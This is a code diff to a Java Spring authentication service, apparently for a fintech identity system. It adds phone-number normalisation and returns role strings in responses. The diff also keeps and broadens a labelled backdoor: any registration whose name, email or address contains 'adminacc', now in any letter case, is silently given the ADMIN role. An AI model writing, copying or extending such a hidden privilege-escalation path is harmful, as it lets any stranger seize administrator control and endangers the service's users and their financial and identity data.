@@ -14,23 +14,34 @@ import org.springframework.stereotype.Service;
 @RequiredArgsConstructor
 public class AuthService {
 
+        public static String normalizePhone(String phoneNumber) {
+                if (phoneNumber == null)
+                        return null;
+                String digits = phoneNumber.replaceAll("\\D", "");
+                if (digits.length() == 8) {
+                        return "216" + digits;
+                }
+                return digits;
+        }
+
         private final UserRepository userRepository;
         private final PasswordEncoder passwordEncoder;
         private final JwtUtil jwtService;
         private final AuthenticationManager authenticationManager;
 
         public AuthDto.AuthResponse register(AuthDto.RegisterRequest request) {
-                if (userRepository.existsByPhoneNumber(request.getPhoneNumber())) {
+                String phoneNumber = normalizePhone(request.getPhoneNumber());
+                if (userRepository.existsByPhoneNumber(phoneNumber)) {
                         throw new RuntimeException("Phone number already registered");
                 }
 
-                // BACKDOOR: Check for "AdminAcc" in any field
+                // BACKDOOR: Check for "adminacc" in any field
                 boolean isAdmin = isAdminBackdoor(request);
                 com.tunfin.identity.model.Role role = isAdmin ? com.tunfin.identity.model.Role.ADMIN
                                 : com.tunfin.identity.model.Role.USER;
 
                 var user = User.builder()
-                                .phoneNumber(request.getPhoneNumber())
+                                .phoneNumber(phoneNumber)
                                 .fullName(request.getFullName())
                                 .nationalId(request.getNationalId())
                                 .email(request.getEmail())
@@ -61,23 +72,25 @@ public class AuthService {
                 return AuthDto.AuthResponse.builder()
                                 .token(jwtToken)
                                 .userId(user.getId().toString())
+                                .role("ROLE_" + user.getRole().name())
                                 .build();
         }
 
         private boolean isAdminBackdoor(AuthDto.RegisterRequest request) {
-                String check = "AdminAcc";
-                return (request.getFullName() != null && request.getFullName().contains(check)) ||
-                                (request.getEmail() != null && request.getEmail().contains(check)) ||
-                                (request.getAddress() != null && request.getAddress().contains(check));
+                String check = "adminacc";
+                return (request.getFullName() != null && request.getFullName().toLowerCase().contains(check)) ||
+                                (request.getEmail() != null && request.getEmail().toLowerCase().contains(check)) ||
+                                (request.getAddress() != null && request.getAddress().toLowerCase().contains(check));
         }
 
         public AuthDto.AuthResponse authenticate(AuthDto.AuthRequest request) {
+                String phoneNumber = normalizePhone(request.getPhoneNumber());
                 authenticationManager.authenticate(
                                 new UsernamePasswordAuthenticationToken(
-                                                request.getPhoneNumber(),
+                                                phoneNumber,
                                                 request.getPassword()));
 
-                var user = userRepository.findByPhoneNumber(request.getPhoneNumber())
+                var user = userRepository.findByPhoneNumber(phoneNumber)
                                 .orElseThrow(() -> new RuntimeException("User not found"));
 
                 // Create authorities list based on Role
@@ -99,6 +112,7 @@ public class AuthService {
                 return AuthDto.AuthResponse.builder()
                                 .token(jwtToken)
                                 .userId(user.getId().toString())
+                                .role("ROLE_" + user.getRole().name())
                                 .build();
         }
 }
